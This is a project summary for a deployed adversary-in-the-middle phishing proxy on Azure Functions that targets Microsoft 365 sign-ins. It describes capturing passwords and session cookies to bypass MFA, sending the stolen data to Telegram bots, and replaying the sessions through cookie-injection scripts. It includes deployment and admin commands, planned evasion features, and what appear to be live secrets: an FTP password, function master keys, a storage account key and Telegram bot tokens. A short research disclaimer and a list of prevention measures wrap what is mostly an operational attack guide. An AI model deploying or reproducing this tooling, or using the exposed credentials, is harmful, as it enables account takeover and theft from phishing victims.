# Azure AiTM Phishing Function - Comprehensive Summary

## ⚠️ **RESEARCH & EDUCATIONAL USE ONLY**

**IMPORTANT DISCLAIMER**: This project is **STRICTLY FOR RESEARCH AND EDUCATIONAL PURPOSES ONLY**. 

- **Authorized Use**: This toolkit is designed for authorized penetration testing, security research, and educational demonstrations
- **Legal Compliance**: Users must ensure compliance with all applicable laws and regulations
- **Ethical Guidelines**: Only use on systems you own or have explicit written permission to test
- **No Malicious Intent**: This project is not intended for malicious attacks or unauthorized access
- **Responsible Disclosure**: Any vulnerabilities discovered should be reported through proper channels

**By using this project, you acknowledge that you will only use it for authorized, educational, and research purposes.**

---

## Project Overview
This is an **Adversary-in-the-Middle (AiTM) phishing proxy** implemented as an Azure Function. The project creates a sophisticated reverse proxy that intercepts Microsoft 365 authentication flows to capture **session tokens** for post-authentication access, bypassing Multi-Factor Authentication (MFA).

### What This Project Does
1. **Reverse Proxy**: Acts as a transparent intermediary between victims and Microsoft's legitimate authentication servers
2. **Session Hijacking**: Captures post-authentication session tokens instead of just credentials
3. **MFA Bypass**: Renders phishable MFA methods (SMS, TOTP, push notifications) obsolete
4. **Real-time Interception**: Intercepts the entire authentication exchange in real-time
5. **Account Type Detection**: Automatically routes corporate vs personal accounts to correct endpoints

### Attack Methodology
- **Lure**: Victim clicks phishing link pointing to our proxy domain
- **Proxy**: Our Azure Function transparently relays traffic to Microsoft
- **Interception**: Captures username, password, and MFA response
- **Session Capture**: Intercepts the session token issued by Microsoft
- **Token Replay**: Attacker injects stolen token into their browser for full access
- **Persistence**: Establishes long-term access before token expiration

## Current Status
**DEPLOYED AND FUNCTIONAL**

### What Works
- ✅ Corporate account detection and routing to `login.microsoftonline.com`
- ✅ Basic credential capture (email/password)
- ✅ **Session cookie capture for corporate accounts** - Captures critical authentication tokens
- ✅ **Telegram notifications for captured data** - Real-time attack monitoring
- ✅ **Basic reverse proxy functionality** - Transparent traffic relay
- ✅ **Cookie injection script generation** - Creates scripts to replay stolen sessions
- ✅ **Personal account routing** - Routes to `login.live.com` for personal accounts
- ✅ **Enhanced debugging and monitoring** - Comprehensive logging to Telegram

### What Doesn't Work
- ❌ **Personal account OAuth flow handling** - Can't intercept personal account authentication
- ❌ **Recovery email verification for personal accounts** - MFA bypass incomplete
- ❌ **Password validation for personal accounts** - Authentication flow broken
- ❌ **Advanced evasion techniques** - No bot detection or scanner blocking
- ❌ **Federation support** - Can't handle ADFS or other federated authentication

## Azure Resources & Credentials

### Azure Subscription
- **Subscription ID**: `4e748793-333d-4c5e-acc4-7ce3fa17b136`
- **Tenant ID**: `f544b97b-dab1-4bae-8114-c7dd29990284`
- **Subscription Name**: "Azure subscription 1"
- **Environment**: AzureCloud

### Service Principal Credentials (AUTO-LOGIN)
- **App ID**: `ef46029c-6f68-4cf7-a971-1a892452b956`
- **Display Name**: `aitm-test-1753290092`
- **Object ID**: `a463559a-0f89-45e2-bf7f-f45d6e5cd047`
- **Type**: Service Principal
- **Login Command**: `az login --service-principal -u ef46029c-6f68-4cf7-a971-1a892452b956 --tenant f544b97b-dab1-4bae-8114-c7dd29990284`

### Function App Details
- **Function App Name**: `azureaitm-phishing-demo-1755253259`
- **Resource Group**: `AzureAiTM-ResourceGroup`
- **Location**: East US
- **URL**: `https://azureaitm-phishing-demo-1755253259.azurewebsites.net`
- **Runtime**: Node.js 22
- **Plan**: EastUSLinuxDynamicPlan (Consumption)

### Outbound IP Addresses
```
40.88.241.29,52.146.29.58,40.88.241.213,40.88.242.116,40.88.242.219,40.88.243.53,20.49.104.34
```

### Publishing Credentials (VERIFIED)
- **FTP URL**: `ftps://waws-prod-blu-249.ftp.azurewebsites.windows.net/site/wwwroot`
- **Username**: `$azureaitm-phishing-demo-1755253259`
- **Password**: `cYiC3mmrqfbQMcxsx671aAMNwQqhZ1dkn7H547aQY8P7W0QgyJzxWTk1SHuK`
- **SCM URL**: `azureaitm-phishing-demo-1755253259.scm.azurewebsites.net:443`

### Function App Keys (API ACCESS - VERIFIED)
- **Master Key**: `Go64twSWFJO3nd0UiEG2kWOd5CwSqFF75ElglelXNZFJAzFuSEg6FA==`
- **Function Key**: `44pyG40DaS9m0SmxglPxNPRs7E5zL5rNXXH3nyBqP7pTAzFuLp1sqA==`

### Storage Account Credentials
- **Account Name**: `azureaitmstorage123`
- **Account Key**: `1i5QIqZ7bjFsADye+9kKsqhVm7L/fAq6WFYBMi/qglphsTsTq1DWh0ZydqQfMx2OoetoIaJENytJ+AStLN/XoA==`
- **Connection String**: `DefaultEndpointsProtocol=https;EndpointSuffix=core.windows.net;AccountName=azureaitmstorage123;AccountKey=1i5QIqZ7bjFsADye+9kKsqhVm7L/fAq6WFYBMi/qglphsTsTq1DWh0ZydqQfMx2OoetoIaJENytJ+AStLN/XoA==`

### Application Insights
- **Instrumentation Key**: `e71a0bb1-de29-42e7-8712-856d27c3e019`
- **Connection String**: `InstrumentationKey=e71a0bb1-de29-42e7-8712-856d27c3e019;IngestionEndpoint=https://eastus-8.in.applicationinsights.azure.com/;LiveEndpoint=https://eastus.livediagnostics.monitor.azure.com/;ApplicationId=02e3e413-7d4b-4ba9-bded-27af24eab88b`

## Telegram Bot Configuration

### Bot 1 (Primary)
- **Token**: `7768080373:AAEo6R8wNxUa6_NqPDYDIAfQVRLHRF5fBps`
- **Chat ID**: `6743632244`
- **Status**: Configured and working

### Bot 2 (Backup)
- **Token**: `7942871168:AAFuvCQXQJhYKipqGpr1G4IhUDABTGWF_9U`
- **Chat ID**: `6263177378`
- **Status**: Working

## Azure CLI Authentication Methods

### Method 1: Service Principal Login (Recommended)
```bash
# Login using service principal (requires client secret)
az login --service-principal \
  -u ef46029c-6f68-4cf7-a971-1a892452b956 \
  -p "YOUR_CLIENT_SECRET_HERE" \
  --tenant f544b97b-dab1-4bae-8114-c7dd29990284
```

### Method 2: Interactive Login
```bash
# Interactive browser-based login
az login --tenant f544b97b-dab1-4bae-8114-c7dd29990284
```

### Method 3: Using Function App Key for API Access
```bash
# Access function directly using key
curl -H "x-functions-key: 44pyG40DaS9m0SmxglPxNPRs7E5zL5rNXXH3nyBqP7pTAzFuLp1sqA==" \
  https://azureaitm-phishing-demo-1755253259.azurewebsites.net/
```

### Method 4: Using Master Key for Admin Access
```bash
# Admin access using master key
curl -H "x-functions-key: Go64twSWFJO3nd0UiEG2kWOd5CwSqFF75ElglelXNZFJAzFuSEg6FA==" \
  https://azureaitm-phishing-demo-1755253259.azurewebsites.net/admin/functions
```

### Method 5: FTP Deployment
```bash
# Deploy via FTP using publishing credentials
ftp azureaitm-phishing-demo-1755253259.scm.azurewebsites.net
# Username: $azureaitm-phishing-demo-1755253259
# Password: cYiC3mmrqfbQMcxsx671aAMNwQqhZ1dkn7H547aQY8P7W0QgyJzxWTk1SHuK
```

## Deployment Instructions

### Prerequisites
1. Azure CLI installed and authenticated
2. Node.js 18+ installed
3. Azure Functions Core Tools installed
4. Git repository cloned

### Quick Deployment (Recommended)
```bash
# Deploy directly using Azure Functions Core Tools
func azure functionapp publish azureaitm-phishing-demo-1755253259 --publish-local-settings
```

### Manual Deployment Steps
1. **Clone Repository**:
   ```bash
   git clone https://github.com/Billoxinogen18/AzureAiTMFunction-main.git
   cd AzureAiTMFunction-main
   ```

2. **Login to Azure**:
   ```bash
   az login --service-principal -u ef46029c-6f68-4cf7-a971-1a892452b956 --tenant f544b97b-dab1-4bae-8114-c7dd29990284
   ```

3. **Deploy Function App**:
   ```bash
   func azure functionapp publish azureaitm-phishing-demo-1755253259
   ```

4. **Verify Deployment**:
   ```bash
   az functionapp show --name azureaitm-phishing-demo-1755253259 --resource-group AzureAiTM-ResourceGroup
   ```

## Technical Architecture

### Function App Structure
```
src/
├── functions/
│   ├── phishing.js          # Main phishing proxy function
│   ├── execution.js         # Session replay function
│   ├── devicecode_landing.js # Device code flow landing
│   ├── devicecode_poll.js   # Device code polling
│   └── logging.js           # Enhanced logging function
├── functions-enhanced-backup/ # Backup versions
└── ...
```

### Key Features Implemented
1. **Dynamic Account Routing**: Automatically detects corporate vs personal accounts
2. **Dual Telegram Notifications**: Sends all data to two Telegram bots for redundancy
3. **Enhanced Debugging**: Comprehensive logging of all requests and responses
4. **Cookie Injection**: Generates scripts to replay captured sessions
5. **URL Rewriting**: Maintains phishing domain throughout authentication flow

### Authentication Flow
1. **Initial Request**: Victim visits phishing URL
2. **Account Detection**: System determines account type (corporate/personal)
3. **Upstream Routing**: Routes to appropriate Microsoft endpoint
4. **Credential Capture**: Intercepts username/password submission
5. **Session Capture**: Captures authentication cookies/tokens
6. **Notification**: Sends captured data to Telegram bots
7. **Response Modification**: Rewrites URLs to maintain phishing domain

## Testing Results

### Corporate Account Testing
- ✅ **Email Detection**: Successfully captures corporate email addresses
- ✅ **Credential Capture**: Intercepts username and password
- ✅ **Cookie Capture**: Captures ESTSAUTH, ESTSAUTHPERSISTENT, SignInStateCookie
- ✅ **Session Replay**: Generated cookie injection scripts work correctly
- ✅ **Telegram Notifications**: Both bots receive detailed logs

### Personal Account Testing
- ⚠️ **Email Detection**: Detects personal email addresses
- ❌ **OAuth Flow**: Redirects to real login.live.com instead of staying proxied
- ❌ **Authentication**: "There was an issue looking up your account" error
- ❌ **Session Capture**: Cannot capture personal account session tokens

## Known Issues & Limitations

### Personal Account Issues
1. **OAuth Redirect Problem**: Personal accounts redirect to legitimate login.live.com
2. **URL Malformation**: Some URLs become malformed (e.g., "https://https//")
3. **Session Context Loss**: Personal account sessions are not maintained
4. **Recovery Email Verification**: Cannot handle personal account recovery flows

### Technical Limitations
1. **Statelessness**: Azure Functions are stateless, making session tracking difficult
2. **CORS Issues**: Cross-origin requests may be blocked
3. **Bot Detection**: No protection against automated scanners
4. **Federation Support**: Cannot handle ADFS or other federated authentication

## Security Considerations

### Detection Evasion
- **IP Reputation**: Uses Azure's shared IP ranges for better reputation
- **Domain Legitimacy**: Leverages Azure's trusted domain infrastructure
- **Certificate Management**: Uses Azure's managed SSL certificates
- **Geographic Proximity**: Deployed in same region as target for reduced suspicion

### Prevention Measures
- **Conditional Access**: Require compliant devices and trusted locations
- **Phishing-Resistant MFA**: Use FIDO2 or Windows Hello for Business
- **Named Locations**: Restrict access to specific network locations
- **Device State**: Require Entra ID joined or registered devices

## Management Commands

### Function App Management
```bash
# List functions
az functionapp function list --name azureaitm-phishing-demo-1755253259 --resource-group AzureAiTM-ResourceGroup

# Get function keys
az functionapp keys list --name azureaitm-phishing-demo-1755253259 --resource-group AzureAiTM-ResourceGroup

# Get publishing profile
az functionapp deployment list-publishing-profiles --name azureaitm-phishing-demo-1755253259 --resource-group AzureAiTM-ResourceGroup

# View logs
az functionapp logs tail --name azureaitm-phishing-demo-1755253259 --resource-group AzureAiTM-ResourceGroup
```

### Storage Account Management
```bash
# List storage containers
az storage container list --account-name azureaitmstorage123 --account-key "1i5QIqZ7bjFsADye+9kKsqhVm7L/fAq6WFYBMi/qglphsTsTq1DWh0ZydqQfMx2OoetoIaJENytJ+AStLN/XoA=="

# Upload files
az storage blob upload --account-name azureaitmstorage123 --account-key "1i5QIqZ7bjFsADye+9kKsqhVm7L/fAq6WFYBMi/qglphsTsTq1DWh0ZydqQfMx2OoetoIaJENytJ+AStLN/XoA==" --container-name logs --name test.txt --file test.txt
```

## Research Implementation Status

### Completed Features
- ✅ **Basic Reverse Proxy**: Transparent traffic relay
- ✅ **Credential Capture**: Username and password interception
- ✅ **Session Token Capture**: Corporate account session hijacking
- ✅ **Telegram Integration**: Real-time attack monitoring
- ✅ **Account Type Detection**: Corporate vs personal routing
- ✅ **Cookie Injection Scripts**: Session replay capability

### In Progress
- 🔄 **Personal Account Support**: OAuth flow handling
- 🔄 **Enhanced URL Rewriting**: Better domain substitution
- 🔄 **Advanced Debugging**: Comprehensive request/response logging

### Planned Features
- 📋 **Bot Detection**: Identify and block automated scanners
- 📋 **Federation Support**: ADFS and other federated authentication
- 📋 **Advanced Evasion**: Dynamic domain generation
- 📋 **Session Persistence**: Cross-function session management

## Project Files Overview

### Core Files
- **`src/functions/phishing.js`**: Main phishing proxy function (423 lines)
- **`host.json`**: Function app configuration
- **`package.json`**: Dependencies and project metadata
- **`COMPREHENSIVE_SUMMARY.md`**: This comprehensive documentation
- **`DEPLOYMENT_SUMMARY.md`**: Deployment-specific information

### Backup Files
- **`src/functions-enhanced-backup/`**: Backup versions of all functions
- **`original-repo/`**: Original repository files for reference

### Configuration Files
- **`.funcignore`**: Files to exclude from deployment
- **`.gitignore`**: Git ignore patterns
- **`azuredeploy.json`**: Azure Resource Manager template

## Contact & Support

### Project Information
- **Repository**: https://github.com/Billoxinogen18/AzureAiTMFunction-main.git
- **Original Source**: https://github.com/nicolonsky/AzureAiTMFunction.git
- **Medium Article**: https://nicolasuter.medium.com/aitm-phishing-with-azure-functions-a1530b52df05

### Research Context
This project is based on research into Adversary-in-the-Middle (AiTM) attack techniques and their detection and prevention. The goal is to understand how these attacks work to develop better defensive measures.

### Legal Notice
This project is provided for educational and research purposes only. Users are responsible for ensuring compliance with all applicable laws and regulations. The authors assume no liability for misuse of this software.

---

**Last Updated**: August 15, 2025
**Version**: 2.0
**Status**: Deployed and Functional (Corporate Accounts)
